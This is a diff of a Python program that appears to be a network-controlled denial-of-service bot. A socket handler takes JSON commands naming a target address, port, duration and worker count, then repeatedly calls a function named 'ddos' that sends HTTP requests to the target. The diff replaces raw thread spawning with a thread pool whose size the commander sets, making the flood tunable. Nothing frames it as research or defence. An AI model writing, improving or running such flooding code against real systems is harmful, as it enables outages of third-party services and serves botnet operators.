@@ -3,10 +3,9 @@ import socket
 import threading
 import time
 import requests
-print(time.time())
+from concurrent.futures import ThreadPoolExecutor
 def ddos(address, port):
-        requests.get(f"{address}:{port}", data=0x2FFFFF)
-
+    requests.get(f"{address}:{port}", data=bytes([0x2F]))
 def handle_client(client_socket, address):
     try:
         data = client_socket.recv(1024).decode('utf-8')
@@ -17,9 +16,12 @@ def handle_client(client_socket, address):
         except json.JSONDecodeError:
             client_socket.send(b"Invalid JSON")
         start_time = time.time()
-        while time.time() < (start_time + json_data['time'] + 1):
-            start = threading.Thread(target=ddos,args=(json_data['address'],json_data['port'],))
-            start.start()        
+        json_data['time'] = int(json_data['time'])
+        with ThreadPoolExecutor(max_workers=int(json_data['workers'])) as executor:
+            print("start")
+            while time.time() < (start_time + json_data['time'] + 1):
+                executor.submit(ddos, json_data['address'], json_data['port']).result()
+            print("end")
     except Exception as e:
         print(f"Error handling client {address}: {e}")
     finally:
